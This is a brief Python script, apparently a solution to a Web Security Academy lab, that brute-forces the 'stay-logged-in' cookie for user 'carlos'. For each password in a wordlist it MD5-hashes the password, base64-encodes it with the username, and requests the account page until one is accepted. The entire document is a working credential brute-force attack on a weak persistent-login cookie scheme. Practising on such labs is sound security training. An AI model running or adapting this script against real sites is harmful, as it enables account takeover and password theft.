import requests
import base64
import hashlib

user = "carlos"
URL = f"https://0a200042041eb1de8072710a0097009b.web-security-academy.net/my-account?id={user}"

with open("passwords.txt") as f:
    for line in f:
        password = line.strip()
        password_hash = hashlib.md5(password.encode()).hexdigest()
        cookie_val = base64.b64encode(f"{user}:{password_hash}".encode()).decode()
        cookies = {"stay-logged-in": cookie_val}
        r = requests.get(URL, cookies=cookies, allow_redirects=False)
        if r.status_code == 200:
            print(f"Password is: {password}")
            break
